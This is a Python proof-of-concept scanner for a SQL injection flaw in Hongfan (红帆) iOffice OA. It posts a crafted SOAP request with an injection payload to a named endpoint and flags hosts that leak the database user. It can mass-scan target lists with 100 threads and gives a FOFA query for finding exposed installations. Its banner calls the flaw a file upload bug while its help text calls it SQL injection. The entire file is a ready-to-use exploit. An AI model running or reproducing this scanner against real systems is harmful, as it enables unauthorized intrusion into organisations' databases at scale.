#-*- coding: utf-8 -*-
import argparse,sys,requests
import re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
  _    _  ____  _   _  _____ ______      _   _ 
 | |  | |/ __ \| \ | |/ ____|  ____/\   | \ | |
 | |__| | |  | |  \| | |  __| |__ /  \  |  \| |
 |  __  | |  | | . ` | | |_ |  __/ /\ \ | . ` |
 | |  | | |__| | |\  | |__| | | / ____ \| |\  |
 |_|  |_|\____/|_| \_|\_____|_|/_/    \_\_| \_|
                                               
                                                              tag : HONGFAN 系统文件上传漏洞 poc
                                                                             @author : Gui1de
    """
    print(test)

burp0_headers = {

    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": "http://tempuri.org/ioffice/udfmr/GetEmpSearch"
}

def poc(target):
    if "http://" in target:
        print('请去掉"http://"后重新输入')
    else:
        burp0_url = "http://"+target+"/iOffice/prg/set/wss/udfmr.asmx"
        burp0_data="<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetEmpSearch xmlns=\"http://tempuri.org/ioffice/udfmr\">\r\n      <condition>1=user_name()</condition>\r\n    </GetEmpSearch>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n"
        try:
            res = requests.post(burp0_url,headers=burp0_headers,data=burp0_data,verify=False,timeout=5).text
            if "dbo" in res:
                print(f"[+] {target} is vulable \n {res}")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-] {target} is not vulable")
        except:
            print(f"[*] {target} 请求失败")

def main():
    banner()
    parser = argparse.ArgumentParser(description='红帆OA SQL注入漏洞fofa语法:app="红帆-ioffice"')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()